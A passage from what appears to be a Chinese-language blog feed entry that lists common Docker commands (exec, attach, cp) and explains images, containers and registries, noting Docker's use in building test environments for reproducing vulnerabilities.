容器ID</li><li>进入正运行的容器并以命令行交互：<br>docker exec -it 容器ID /bin/bash</li><li>重新进入正运行的容器：<br>docker attach 容器ID<br><font color=red>attach：直接进入容器启动的命令终端，不会启动新的进程；<br>exec：是在容器打开新的终端，并且可以启动新的进程</font></li><li>从容器内拷贝文件到主机上：<br>docker cp 容器ID:容器内路径 目的主机路径</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=green&gt;Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源，可用于开发，交付和运行应用程序的开放平台。而在安全测试中我们可以利用docker快速搭建出理想环境，进而复现测试漏洞，下面👇我整理出来一些常用命令，作为备忘。&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&quot;0、重点！重点！重点！&quot;&gt;&lt;a href=&quot;#0、重点！重点！重点！&quot; class=&quot;headerlink&quot; title=&quot;0、重点！重点！重点！&quot;&gt;&lt;/a&gt;0、重点！重点！重点！&lt;/h3&gt;&lt;p&gt;Docker三要素：&lt;font color=red&gt;镜像、容器、仓库&lt;/font&gt;&lt;br&gt;仓库：集中存放镜像文件的地方；仓库分为公开仓库和私有仓库，目前全世界最大的仓库是Docker官方的 Docker Hub&lt;br&gt;镜像：Docker 镜像（Image），就相当于是一个 root 文件系统。&lt;br&gt;容器：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。
    
    </summary>
    
    
    
  </entry>
  
</feed>
